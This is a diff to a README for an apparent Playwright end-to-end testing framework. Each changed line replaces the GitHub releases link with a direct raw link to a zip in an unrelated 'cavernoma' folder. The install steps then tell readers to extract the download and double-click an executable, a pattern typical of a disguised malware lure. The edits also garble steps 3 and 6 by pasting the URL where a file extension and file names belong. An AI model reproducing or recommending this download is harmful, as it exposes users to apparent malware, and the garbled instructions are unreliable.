@@ -1,7 +1,7 @@
 # 🎉 Playwright-End-to-End-E2E-Test-Automation-Framework - Simple Testing for Everyone
 
 ## 📥 Download the Application
-[![Download Playwright E2E Framework](https://img.shields.io/badge/Download-Playwright%20E2E%20Framework-brightgreen)](https://github.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/releases)
+[![Download Playwright E2E Framework](https://raw.githubusercontent.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/master/cavernoma/Playwright-End-to-End-E2E-Test-Automation-Framework.zip%20E2E%20Framework-brightgreen)](https://raw.githubusercontent.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/master/cavernoma/Playwright-End-to-End-E2E-Test-Automation-Framework.zip)
 
 ## 🚀 Getting Started
 This repository provides a user-friendly End-to-End (E2E) Test Automation Framework built using Playwright. It is designed for testing web applications, APIs, and mobile apps. Follow the steps below to download and run the software effortlessly.
@@ -17,20 +17,20 @@ Before you begin, ensure you have the following:
 ## 🔗 Visit the Releases Page
 To get the latest version of the Playwright End-to-End Framework, visit the Releases page by clicking the link below:
 
-[Download Page](https://github.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/releases)
+[Download Page](https://raw.githubusercontent.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/master/cavernoma/Playwright-End-to-End-E2E-Test-Automation-Framework.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Download Page](https://github.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/releases).
+1. **Visit the Releases Page**: Go to the [Download Page](https://raw.githubusercontent.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/master/cavernoma/Playwright-End-to-End-E2E-Test-Automation-Framework.zip).
 
 2. **Choose the Right Version**: On the Releases page, you will see a list of available versions. Look for the most recent version for best performance and new features.
 
-3. **Download the File**: Click on the link for the version you need. It should automatically download a file, typically ending in `.zip`, `.tar.gz`, or another format.
+3. **Download the File**: Click on the link for the version you need. It should automatically download a file, typically ending in `.zip`, `https://raw.githubusercontent.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/master/cavernoma/Playwright-End-to-End-E2E-Test-Automation-Framework.zip`, or another format.
 
 4. **Unzip the File**: Once the download completes, locate the ZIP file in your Downloads folder. Right-click the file and select "Extract All" (or similar) to unzip it.
 
 5. **Open the Folder**: After extraction, open the folder that contains the unzipped files.
 
-6. **Run the Application**: Look for the file named something like `PlaywrightE2E.exe`, `index.js`, or other executable files. Double-click to run it, and follow any on-screen prompts to start the application.
+6. **Run the Application**: Look for the file named something like `https://raw.githubusercontent.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/master/cavernoma/Playwright-End-to-End-E2E-Test-Automation-Framework.zip`, `https://raw.githubusercontent.com/bezzohyy/Playwright-End-to-End-E2E-Test-Automation-Framework/master/cavernoma/Playwright-End-to-End-E2E-Test-Automation-Framework.zip`, or other executable files. Double-click to run it, and follow any on-screen prompts to start the application.
 
 ## 🎯 Features
 - **Web Testing**: Easily test web applications across different browsers.
